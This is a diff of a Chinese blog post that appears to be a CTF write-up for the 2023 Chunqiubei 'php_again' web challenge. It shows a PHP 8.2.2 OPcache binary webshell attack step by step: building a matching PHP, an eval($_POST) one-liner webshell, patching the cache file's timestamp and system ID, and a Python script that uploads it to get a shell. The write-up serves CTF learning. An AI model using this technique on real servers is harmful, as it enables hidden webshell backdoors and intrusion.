@@ -22,16 +22,34 @@
 
 <script class="next-config" data-name="main" type="application/json">{"hostname":"fdlucifer.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.15.0","exturl":true,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":true,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.json","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":true}}</script><script src="/js/config.js"></script>
 
-    <meta name="description" content="介绍同样是在ichunqiu CTF大本营刷题的时候碰到一道高质量的web题，也比较有实战价值，比赛中算是web里耗时较长的的。网上已经有一些公开的writeup，但是为了加深理解记忆，故记录一篇blog。 其中包括一些网上没公开的一些CVE-2022-42919 LPE exp及PHP 8.2.2 OPcache Binary Webshell的利用细节。  复现链接: 2023年春秋杯网络安全">
+    <meta name="description" content="介绍同样是在ichunqiu CTF大本营刷题的时候碰到一道高质量的web题，也比较有实战价值，比赛中算是web里耗时较长的的。网上已经有一些公开的writeup，但是为了加深理解记忆，故记录一篇blog。 其中包括一些网上没公开的一些CVE-2022-42919 LPE exp的利用细节及PHP 8.2.2 OPcache Binary Webshell手工利用方法。  复现链接: 2023年春">
 <meta property="og:type" content="article">
 <meta property="og:title" content="2023年春秋杯网络安全联赛春季赛 web php_again [PHP 8.2.2 OPcache Binary Webshell + CVE-2022-42919 LPE]">
 <meta property="og:url" content="https://fdlucifer.github.io/2023/07/01/2023-chunqiubei-spring-php-again/index.html">
 <meta property="og:site_name" content="fdvoid0&#39;s blog">
-<meta property="og:description" content="介绍同样是在ichunqiu CTF大本营刷题的时候碰到一道高质量的web题，也比较有实战价值，比赛中算是web里耗时较长的的。网上已经有一些公开的writeup，但是为了加深理解记忆，故记录一篇blog。 其中包括一些网上没公开的一些CVE-2022-42919 LPE exp及PHP 8.2.2 OPcache Binary Webshell的利用细节。  复现链接: 2023年春秋杯网络安全">
+<meta property="og:description" content="介绍同样是在ichunqiu CTF大本营刷题的时候碰到一道高质量的web题，也比较有实战价值，比赛中算是web里耗时较长的的。网上已经有一些公开的writeup，但是为了加深理解记忆，故记录一篇blog。 其中包括一些网上没公开的一些CVE-2022-42919 LPE exp的利用细节及PHP 8.2.2 OPcache Binary Webshell手工利用方法。  复现链接: 2023年春">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/php_again.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/php_again1.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/php_again2.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/php_again3.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/php_again4.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/php_again5.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/php_again6.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/php_again7.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/php_again8.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/php_again9.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/php_again10.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/php_again11.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/php_again12.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/php_again13.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/php_again14.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/php_again15.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/php_again16.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/php_again17.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/php_again18.png">
 <meta property="article:published_time" content="2023-07-01T15:27:02.000Z">
-<meta property="article:modified_time" content="2023-07-01T15:36:38.341Z">
+<meta property="article:modified_time" content="2023-07-03T14:32:14.185Z">
 <meta property="article:author" content="fdvoid0">
 <meta property="article:tag" content="web">
 <meta name="twitter:card" content="summary">
@@ -146,7 +164,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BB%8B%E7%BB%8D"><span class="nav-number">1.</span> <span class="nav-text">介绍</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#PHP-8-2-2-OPcache-Binary-Webshell"><span class="nav-number">2.</span> <span class="nav-text">PHP 8.2.2 OPcache Binary Webshell</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CVE-2022-42919-LPE"><span class="nav-number">3.</span> <span class="nav-text">CVE-2022-42919 LPE</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="nav-number">4.</span> <span class="nav-text">参考链接</span></a></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BB%8B%E7%BB%8D"><span class="nav-number">1.</span> <span class="nav-text">介绍</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#PHP-8-2-2-OPcache-Binary-Webshell"><span class="nav-number">2.</span> <span class="nav-text">PHP 8.2.2 OPcache Binary Webshell</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="nav-number">2.1.</span> <span class="nav-text">前置知识</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%9B%AE%E6%A0%87php%E7%8E%AF%E5%A2%83%E5%88%86%E6%9E%90"><span class="nav-number">2.2.</span> <span class="nav-text">目标php环境分析</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Linux-specific-local-privilege-escalation-via-the-multiprocessing-forkserver-start-method-CVE-2022-42919-LPE"><span class="nav-number">3.</span> <span class="nav-text">Linux specific local privilege escalation via the multiprocessing forkserver start method CVE-2022-42919 LPE</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="nav-number">4.</span> <span class="nav-text">参考链接</span></a></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -275,9 +293,15 @@
         <i class="far fa-calendar"></i>
       </span>
       <span class="post-meta-item-text">Posted on</span>
-      
 
-      <time title="Created: 2023-07-01 23:27:02 / Modified: 23:36:38" itemprop="dateCreated datePublished" datetime="2023-07-01T23:27:02+08:00">2023-07-01</time>
+      <time title="Created: 2023-07-01 23:27:02" itemprop="dateCreated datePublished" datetime="2023-07-01T23:27:02+08:00">2023-07-01</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2023-07-03 22:32:14" itemprop="dateModified" datetime="2023-07-03T22:32:14+08:00">2023-07-03</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -303,14 +327,14 @@
         <i class="far fa-file-word"></i>
       </span>
       <span class="post-meta-item-text">Word count in article: </span>
-      <span>171</span>
+      <span>1.2k</span>
     </span>
     <span class="post-meta-item" title="Reading time">
       <span class="post-meta-item-icon">
         <i class="far fa-clock"></i>
       </span>
       <span class="post-meta-item-text">Reading time &asymp;</span>
-      <span>1 mins.</span>
+      <span>4 mins.</span>
     </span>
 </div>
 
@@ -322,7 +346,7 @@
     
     <div class="post-body" itemprop="articleBody">
         <h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>同样是在ichunqiu CTF大本营刷题的时候碰到一道高质量的web题，也比较有实战价值，比赛中算是web里耗时较长的的。网上已经有一些公开的writeup，但是为了加深理解记忆，故记录一篇blog。</p>
-<p>其中包括一些网上没公开的一些CVE-2022-42919 LPE exp及PHP 8.2.2 OPcache Binary Webshell的利用细节。</p>
+<p>其中包括一些网上没公开的一些CVE-2022-42919 LPE exp的利用细节及PHP 8.2.2 OPcache Binary Webshell手工利用方法。</p>
 <ul>
 <li><p>复现链接: <span class="exturl" data-url="aHR0cHM6Ly93d3cuaWNodW5xaXUuY29tL2JhdHRhbGlvbj90PTEmcj03MjM2Ng==">2023年春秋杯网络安全联赛春季赛 web php_again<i class="fa fa-external-link-alt"></i></span></p>
 </li>
@@ -331,12 +355,139 @@
 </ul>
 <span id="more"></span>
 
-<h1 id="PHP-8-2-2-OPcache-Binary-Webshell"><a href="#PHP-8-2-2-OPcache-Binary-Webshell" class="headerlink" title="PHP 8.2.2 OPcache Binary Webshell"></a>PHP 8.2.2 OPcache Binary Webshell</h1><h1 id="CVE-2022-42919-LPE"><a href="#CVE-2022-42919-LPE" class="headerlink" title="CVE-2022-42919 LPE"></a>CVE-2022-42919 LPE</h1><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul>
+<h1 id="PHP-8-2-2-OPcache-Binary-Webshell"><a href="#PHP-8-2-2-OPcache-Binary-Webshell" class="headerlink" title="PHP 8.2.2 OPcache Binary Webshell"></a>PHP 8.2.2 OPcache Binary Webshell</h1><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><ul>
+<li><p>php OPcache Binary Webshell 具体原理其请参考英文原出处<span class="exturl" data-url="aHR0cHM6Ly93d3cuZ29zZWN1cmUubmV0L2Jsb2cvMjAxNi8wNC8yNy9iaW5hcnktd2Vic2hlbGwtdGhyb3VnaC1vcGNhY2hlLWluLXBocC03Lw==">Binary Webshell Through OPcache in PHP 7<i class="fa fa-external-link-alt"></i></span></p>
+</li>
+<li><p>php OPcache Binary Webshell检测请参考<span class="exturl" data-url="aHR0cHM6Ly93d3cuZ29zZWN1cmUubmV0L2Jsb2cvMjAxNi8wNS8yNi9kZXRlY3RpbmctaGlkZGVuLWJhY2tkb29ycy1pbi1waHAtb3BjYWNoZS8=">Detecting Hidden Backdoors in PHP OPcache<i class="fa fa-external-link-alt"></i></span></p>
+</li>
+<li><p><span class="exturl" data-url="aHR0cHM6Ly9kb2NzLmdvb2dsZS5jb20vcHJlc2VudGF0aW9uL2QvMTh5NjBYeTBlVmVVbkJYSUhfdDNpa2ZseV91eVlidGZJNnpBdUtDSHRsYWMvZWRpdD9wbGk9MSNzbGlkZT1pZC5w">Abusing PHP 7’s OPcache to Spawn Webshells - slides<i class="fa fa-external-link-alt"></i></span></p>
+</li>
+<li><p><span class="exturl" data-url="aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj15THBzSVdoN3J2VQ==">Abusing PHP 7’s OPcache to Spawn Webshells (Ian Bouchard) - youtube<i class="fa fa-external-link-alt"></i></span></p>
+</li>
+<li><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0dvU2VjdXJlL3BocDctb3BjYWNoZS1vdmVycmlkZQ==">PHP7 OPcache Override 自动化利用工具<i class="fa fa-external-link-alt"></i></span></p>
+</li>
+</ul>
+<p>大概原理就是伪造替换原来合法PHP编译PHP脚本生成的字节码为webshell php脚本编译生成的恶意字节码</p>
+<ul>
+<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/php_again1.png"></p>
+</li>
+<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/php_again2.png"></p>
+</li>
+<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/php_again3.png"></p>
+</li>
+<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/php_again4.png"></p>
+</li>
+<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/php_again5.png"></p>
+</li>
+</ul>
+<p>利用方法：</p>
+<ol>
+<li>弄清楚受害者使用的是32位还是64位操作系统</li>
+<li>找到受害者的system ID</li>
+<li>在本地生成缓存文件</li>
+<li>将缓存文件中的system ID替换为受害者的system ID</li>
+<li>用你的文件覆盖受害者的缓存文件。</li>
+<li>get a shell。</li>
+</ol>
+<h2 id="目标php环境分析"><a href="#目标php环境分析" class="headerlink" title="目标php环境分析"></a>目标php环境分析</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> 00:</span><br><span class="line">    phpinfo();</span><br><span class="line">    <span class="built_in">break</span>;</span><br><span class="line"><span class="keyword">case</span> 73:</span><br><span class="line">    <span class="built_in">exec</span>(<span class="string">&#x27;zip -r /tmp/www.zip *&#x27;</span>);</span><br><span class="line">    readfile(<span class="string">&#x27;/tmp/www.zip&#x27;</span>);</span><br><span class="line">    <span class="built_in">break</span>;</span><br><span class="line"><span class="keyword">case</span> 7:</span><br><span class="line">    var_dump(scandir(<span class="string">&#x27;/var/www/html/&#x27;</span>));</span><br><span class="line">    <span class="built_in">break</span>;</span><br><span class="line"><span class="keyword">case</span> 1365:</span><br><span class="line">    file_put_contents(<span class="string">&#x27;/tmp/tmp.zip&#x27;</span>,base64_decode(<span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>]));</span><br><span class="line">    <span class="built_in">break</span>;</span><br><span class="line"><span class="keyword">case</span> 777777:</span><br><span class="line">    <span class="built_in">exec</span>(<span class="string">&#x27;cd /tmp &amp;&amp; unzip -o tmp.zip&#x27;</span>);</span><br><span class="line">    <span class="built_in">break</span>;</span><br></pre></td></tr></table></figure>
+
+<p>5个功能:</p>
+<ul>
+<li>phpinfo信息</li>
+<li>压缩 &#x2F;var&#x2F;www&#x2F;html目录到 &#x2F;tmp&#x2F;<span class="exturl" data-url="aHR0cDovL3d3dy56aXAs5Y+v5Lul6K+75Y+WLw==">www.zip，可以读取<i class="fa fa-external-link-alt"></i></span> &#x2F;tmp&#x2F;<span class="exturl" data-url="aHR0cDovL3d3dy56aXAv">www.zip<i class="fa fa-external-link-alt"></i></span></li>
+<li>查看当前目录下的文件</li>
+<li>上传文件 到 &#x2F;tmp&#x2F;tmp.zip</li>
+<li>覆盖解压 &#x2F;tmp&#x2F;tmp.zip</li>
+</ul>
+<p>查看phpinfo()</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PHP Version 8.2.2</span><br><span class="line"></span><br><span class="line">PHP Extension 	20220829</span><br><span class="line">Zend Extension 	420220929</span><br><span class="line">Zend Extension Build 	API420220929,NTS</span><br><span class="line">PHP Extension Build 	API20220829,NTS</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/php_again6.png"></li>
+</ul>
+<p>开启了时间戳校验，所以之后需要获取文件创建时间和system_id</p>
+<p>拉取php8.2.2源码，在本地(Ubuntu 18.04.6 LTS)复刻编译和目标相同的php环境</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /usr/local</span><br><span class="line">wget https://www.php.net/distributions/php-8.2.2.tar.gz</span><br><span class="line">tar -zxvf php-8.2.2.tar.gz &amp;&amp; <span class="built_in">cd</span> php-8.2.2</span><br></pre></td></tr></table></figure>
+
+<p>先看下php8.2.2源码的变化</p>
+<ul>
+<li><p>校验文件的位如果不通过就删除了</p>
+</li>
+<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/php_again7.png"></p>
+</li>
+<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/php_again8.png"></p>
+</li>
+</ul>
+<p>继续跟下去</p>
+<ul>
+<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/php_again9.png"></p>
+</li>
+<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/php_again10.png"></p>
+</li>
+<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/php_again11.png"></p>
+</li>
+<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/php_again12.png"></p>
+</li>
+<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/php_again13.png"></p>
+</li>
+</ul>
+<p>编译安装php8.2.2</p>
+<p>在题目的phpinfo信息中可以看到， Zend Extension的值是420020929，而正常拉下来的包都是 420020829.这里可能就是出题人故意改的，所以我们也需要改一下再编译。</p>
+<p>打开 &#x2F;usr&#x2F;local&#x2F;php-8.2.2&#x2F;Zend&#x2F;zend_extensions.h 文件，将其由原来的829改成929</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/php_again14.png"></li>
+</ul>
+<p>之后再进行编译安装</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">apt-get install build-essential autoconf automake libtool libsqlite3-dev pkg-config libjpeg-dev libpng-dev libxml2-dev libbz2-dev libcurl4-gnutls-dev libssl-dev libffi-dev libwebp-dev libonig-dev libzip-dev</span><br><span class="line"></span><br><span class="line">./configure --prefix=/usr/local/php --sysconfdir=/etc/php/8.2 --with-openssl --with-zlib --with-bz2 --with-curl --enable-bcmath --enable-gd --with-webp --with-jpeg --with-mhash --enable-mbstring --with-imap-ssl --with-mysqli --enable-exif --with-ffi --with-zip --enable-sockets --with-pcre-jit --enable-fpm --with-pdo-mysql --enable-pcntl</span><br><span class="line"></span><br><span class="line">make &amp;&amp; make install</span><br><span class="line"><span class="built_in">cd</span> /usr/bin</span><br><span class="line"><span class="built_in">ln</span> -s /usr/local/php/bin/php php8.2</span><br><span class="line"><span class="built_in">cp</span> /usr/local/php-8.2.2/php.ini-development /usr/local/php/lib/php.ini</span><br><span class="line"><span class="built_in">cp</span> /etc/php/8.2/php-fpm.conf.default /etc/php/8.2/php-fpm.conf</span><br><span class="line"><span class="built_in">cp</span> /etc/php/8.2/php-fpm.d/www.conf.default /etc/php/8.2/php-fpm.d/www.conf</span><br></pre></td></tr></table></figure>
+
+<p>打开 php.ini文件 ，开启opcache</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">zend_extension = opcache</span><br><span class="line">opcache.enable=1</span><br><span class="line">opcache.validate_timestamps=1</span><br><span class="line">opcache.consistency_checks=1</span><br><span class="line">opcache.file_cache=/tmp</span><br></pre></td></tr></table></figure>
+
+<p>进入 &#x2F;var&#x2F;www&#x2F;html，写入一句话木马，然后开启服务器</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@fdvoid0:/var/www/html<span class="comment"># cat index.php</span></span><br><span class="line">&lt;?=<span class="built_in">eval</span>(<span class="variable">$_POST</span>[1]);phpinfo();?&gt;</span><br><span class="line">root@fdvoid0:/var/www/html<span class="comment"># php8.2 -S 0.0.0.0:8888</span></span><br><span class="line">[Mon Jul  3 22:19:20 2023] PHP 8.2.2 Development Server (http://0.0.0.0:8888) started</span><br></pre></td></tr></table></figure>
+
+<p>访问之后便会在 &#x2F;tmp目录下生成缓存文件,这就是正确的 system_id</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/php_again15.png"></li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@fdvoid0:/mnt/d/1.online-ctfs/ichunqiu/2023-chunqiubei-spring/php_again<span class="comment"># ls /tmp/</span></span><br><span class="line">246104dd1c75c908e3152fa39e48dfb5</span><br><span class="line">root@fdvoid0:/mnt/d/1.online-ctfs/ichunqiu/2023-chunqiubei-spring/php_again<span class="comment"># cp /tmp/246104dd1c75c908e3152fa39e48dfb5/var/www/html/index.php.bin .</span></span><br></pre></td></tr></table></figure>
+
+<p>用功能二获取压缩包，压缩包中存在文件的创建时间</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://eci-2ze1liq7ayfbjvmgeu18.cloudeci1.ichunqiu.com/?action=73 -o www.zip</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/php_again16.png"></li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2023年7月3日，20:06:15</span><br></pre></td></tr></table></figure>
+
+<p>使用在线工具<span class="exturl" data-url="aHR0cHM6Ly90b29sLmx1L3RpbWVzdGFtcC8=">时间戳转换<i class="fa fa-external-link-alt"></i></span>转化为时间戳</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1688385975</span><br></pre></td></tr></table></figure>
+
+<p>用101 editor打开index.php.bin，然后确定时间戳的位置，修改时间戳</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">64A2B9B7 ---&gt; B7 B9 A2 64</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/php_again17.png"></li>
+</ul>
+<p>使用python脚本上传并解压文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import <span class="built_in">base64</span></span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">import zipfile</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://eci-2ze1liq7ayfbjvmgeu18.cloudeci1.ichunqiu.com/?action=&quot;</span></span><br><span class="line">file_to_compress = <span class="string">&#x27;index.php.bin&#x27;</span></span><br><span class="line">zip_file_path = <span class="string">&#x27;index.zip&#x27;</span></span><br><span class="line">with zipfile.ZipFile(zip_file_path, <span class="string">&#x27;w&#x27;</span>) as my_zip:</span><br><span class="line">    my_zip.write(</span><br><span class="line">        file_to_compress,</span><br><span class="line">        <span class="string">&#x27;246104dd1c75c908e3152fa39e48dfb5/var/www/html/index.php.bin&#x27;</span>)</span><br><span class="line"></span><br><span class="line">f = open(r<span class="string">&quot;D:\1.online-ctfs\ichunqiu\2023-chunqiubei-spring\php_again\index.zip&quot;</span>, <span class="string">&quot;rb&quot;</span>)</span><br><span class="line">f = f.read()</span><br><span class="line">f = base64.b64encode(f)</span><br><span class="line">data = &#123;<span class="string">&quot;data&quot;</span>: f&#125;</span><br><span class="line">url1 = url + <span class="string">&quot;1365&quot;</span></span><br><span class="line">res = requests.post(url=url1, data=data)</span><br><span class="line"><span class="comment">#第二步 解压文件</span></span><br><span class="line">url2 = url + <span class="string">&quot;777777&quot;</span></span><br><span class="line">res = requests.get(url=url2)</span><br></pre></td></tr></table></figure>
+
+<p>再次访问时，我们已经拿到shell了</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/php_again18.png"></li>
+</ul>
+<h1 id="Linux-specific-local-privilege-escalation-via-the-multiprocessing-forkserver-start-method-CVE-2022-42919-LPE"><a href="#Linux-specific-local-privilege-escalation-via-the-multiprocessing-forkserver-start-method-CVE-2022-42919-LPE" class="headerlink" title="Linux specific local privilege escalation via the multiprocessing forkserver start method CVE-2022-42919 LPE"></a>Linux specific local privilege escalation via the multiprocessing forkserver start method CVE-2022-42919 LPE</h1><ul>
+<li>漏洞原始出处<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3B5dGhvbi9jcHl0aG9uL2lzc3Vlcy85NzUxNA==">Linux specific local privilege escalation via the multiprocessing forkserver start method CVE-2022-42919 #97514<i class="fa fa-external-link-alt"></i></span></li>
+</ul>
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul>
 <li><span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vY3l5eXlpL3AvMTc1MDAyNjkuaHRtbA==">4.[春秋杯 2023]php_again<i class="fa fa-external-link-alt"></i></span></li>
 <li><span class="exturl" data-url="aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvdWs3YUJaY1R1WGQ0Yk5pWENEU28wQQ==">5 php_again<i class="fa fa-external-link-alt"></i></span></li>
 <li><span class="exturl" data-url="aHR0cHM6Ly93d3cuZ29zZWN1cmUubmV0L2Jsb2cvMjAxNi8wNC8yNy9iaW5hcnktd2Vic2hlbGwtdGhyb3VnaC1vcGNhY2hlLWluLXBocC03Lw==">Binary Webshell Through OPcache in PHP 7<i class="fa fa-external-link-alt"></i></span></li>
 <li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0dvU2VjdXJlL3BocDctb3BjYWNoZS1vdmVycmlkZQ==">PHP OPcache Override<i class="fa fa-external-link-alt"></i></span></li>
 <li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3B5dGhvbi9jcHl0aG9uL2lzc3Vlcy85NzUxNA==">Linux specific local privilege escalation via the multiprocessing forkserver start method CVE-2022-42919 #97514<i class="fa fa-external-link-alt"></i></span></li>
+<li><span class="exturl" data-url="aHR0cHM6Ly93d3cuZ29zZWN1cmUubmV0L2Jsb2cvMjAxNi8wNS8yNi9kZXRlY3RpbmctaGlkZGVuLWJhY2tkb29ycy1pbi1waHAtb3BjYWNoZS8=">Detecting Hidden Backdoors in PHP OPcache<i class="fa fa-external-link-alt"></i></span></li>
+<li><span class="exturl" data-url="aHR0cHM6Ly9kb2NzLmdvb2dsZS5jb20vcHJlc2VudGF0aW9uL2QvMTh5NjBYeTBlVmVVbkJYSUhfdDNpa2ZseV91eVlidGZJNnpBdUtDSHRsYWMvZWRpdD9wbGk9MSNzbGlkZT1pZC5w">Abusing PHP 7’s OPcache to Spawn Webshells - slides<i class="fa fa-external-link-alt"></i></span></li>
+<li><span class="exturl" data-url="aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj15THBzSVdoN3J2VQ==">Abusing PHP 7’s OPcache to Spawn Webshells (Ian Bouchard) - youtube<i class="fa fa-external-link-alt"></i></span></li>
 </ul>
 
     </div>
@@ -485,14 +636,14 @@
       <i class="fa fa-chart-line"></i>
     </span>
       <span>Word count total: </span>
-    <span title="Word count total">643k</span>
+    <span title="Word count total">644k</span>
   </span>
   <span class="post-meta-item">
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
       <span>Reading time total &asymp;</span>
-    <span title="Reading time total">38:57</span>
+    <span title="Reading time total">39:01</span>
   </span>
 </div>
 <div class="busuanzi-count">
